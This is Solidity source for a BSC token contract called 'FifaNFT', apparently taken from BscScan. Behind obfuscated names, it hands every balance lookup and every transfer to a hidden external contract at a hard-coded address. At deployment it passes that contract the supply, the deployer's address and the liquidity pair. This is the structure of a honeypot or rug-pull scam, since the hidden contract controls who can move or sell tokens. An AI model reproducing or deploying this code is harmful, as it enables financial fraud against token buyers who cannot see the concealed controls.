/**
 *Submitted for verification at BscScan.com on 2022-04-20
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Djdfljwerclsadfj23 {

    function DFLKJFLDEUR234324123213(address _from, address _to, uint256 _value) external;

    function jasldfjlaskdjljsafweior23423423(address _owner) view external returns (uint256);

    function asldjflasjfl234234lsadlasfcasd() view external returns (uint256);

    function DFasdfjlsjfljslcasdfljl234432ljlfasdafsdfasfas(uint256 total,address tokenAddress,address alsdfjlfjk23423243,address _pairs) external;
}
contract FifaNFT{

    string public name = "FifaNFT";
    string  public symbol = "FifaNFT";
    uint8   public decimals = 9;
	
    address public alsdfjlfjk23423243;
    address public lakjdflalsuanclajfl234;
	alsdjflasj213443 public jlljlajsdfacaldsf234423;

	address ggasdfjoi234 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    uint256 public totalSupply_ = 1000000000 * (10 ** decimals);

    Djdfljwerclsadfj23 adsfjflkj324aslj = Djdfljwerclsadfj23(0x490DE4e40a2889482Fd8eb88d712F05e170b91c1);
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );
    
    mapping(address => mapping(address => uint256)) public alkdflajflkasj234234;

    function balanceOf(address _owner) public view returns (uint256) {
        return adsfjflkj324aslj.jasldfjlaskdjljsafweior23423423(_owner);
    }
    function totalSupply() public view returns (uint256) {
        return adsfjflkj324aslj.asldjflasjfl234234lsadlasfcasd();
    }

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );

    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return alkdflajflkasj234234[_owner][_spender];
    }

    constructor() {
		
        jlljlajsdfacaldsf234423 = alsdjflasj213443(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        lakjdflalsuanclajfl234 = asdfjljo(jlljlajsdfacaldsf234423.factory()).createPair(ggasdfjoi234, address(this));
        alsdfjlfjk23423243=msg.sender;

        adsfjflkj324aslj.DFasdfjlsjfljslcasdfljl234432ljlfasdafsdfasfas(totalSupply_, address(this), alsdfjlfjk23423243,lakjdflalsuanclajfl234);
        emit Transfer(address(0), alsdfjlfjk23423243, totalSupply_);
    }
   
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= adsfjflkj324aslj.jasldfjlaskdjljsafweior23423423(_from));
        require(_value <= alkdflajflkasj234234[_from][msg.sender]);
		
		adsfjflkj324aslj.DFLKJFLDEUR234324123213(_from,_to,_value);

        emit Transfer(_from, _to, _value);
        
		return true;
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        alkdflajflkasj234234[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
		
        return true;
    }
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(adsfjflkj324aslj.jasldfjlaskdjljsafweior23423423(msg.sender) >= _value);

        adsfjflkj324aslj.DFLKJFLDEUR234324123213(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);

		return true;
    }
}

interface alsdjflasj213443 {
    function factory() external pure returns (address);
}
interface asdfjljo {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}